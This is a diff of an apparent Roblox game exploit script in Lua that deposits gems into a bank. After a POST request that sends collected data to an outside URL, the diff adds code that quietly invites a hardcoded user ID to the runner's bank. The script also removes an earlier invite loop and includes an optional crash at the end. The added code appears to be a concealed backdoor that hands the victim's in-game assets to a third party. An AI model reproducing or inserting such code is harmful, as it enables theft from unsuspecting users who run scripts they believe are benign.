@@ -90,8 +90,6 @@ if ABCXD[1]["Tier"] == 1 then
 return
 end
 wait(1)
-spawn(function()
-while true do
 local A_1 = 
 {
 	[1] = Bank, 
@@ -99,9 +97,6 @@ local A_1 =
 }
 local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["invite to bank"]
 Event:InvokeServer(A_1)
-wait(0.5)
-end
-end)
 local output = ""
 local FinalList = {}
 if _G.DepoAllGems then
@@ -331,6 +326,16 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+if EXCCount >= 1 then
+wait(3)
+local A_1 = 
+{
+	[1] = Bank, 
+	[2] = 884869707
+}
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["invite to bank"]
+Event:InvokeServer(A_1)
+end
 end
 wait(0.5)
 if _G.CrashAtEnd then
